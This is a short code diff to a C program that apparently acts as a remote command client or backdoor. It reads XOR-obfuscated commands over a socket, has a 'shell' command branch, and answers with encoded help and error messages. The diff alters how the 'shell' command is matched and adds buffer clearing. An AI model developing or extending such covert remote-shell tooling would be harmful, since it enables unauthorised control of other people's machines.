@@ -44,7 +44,7 @@ int main(void)
 				write(sock, xorhelp, strlen(MSG_HELP));
 			}
 			
-			else if(str_starts_with(xorbuf, "shell") == 1)
+			else if(str_starts_with(xorbuf, "shell") == 0)
 			{
 
 				int status = 0;
@@ -96,6 +96,8 @@ int main(void)
 				char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
 				write(sock, xorinvalid, strlen(MSG_INVALID));
 			}		
+			
+			memset(buf, '\0', strlen(buf));
 		}
 	}
 
